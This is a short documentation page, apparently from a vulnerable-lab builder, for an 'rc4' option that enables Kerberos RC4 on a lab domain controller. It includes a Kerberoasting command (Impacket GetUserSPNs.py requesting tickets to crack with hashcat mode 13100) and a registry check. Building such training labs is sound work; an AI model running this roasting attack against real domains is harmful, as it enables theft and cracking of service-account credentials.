# rc4

Kerberos RC4 allowed. Sets `kerberos.rc4` to `enabled` on a domain controller (default: the root DC).

Attack:

Roast with RC4 tickets (faster to crack, hashcat 13100):

    GetUserSPNs.py <domain>/<user>:'Aa1234567890!' -dc-ip <dc ip> -request

How to verify:

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters /v SupportedEncryptionTypes   # 0x1c when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
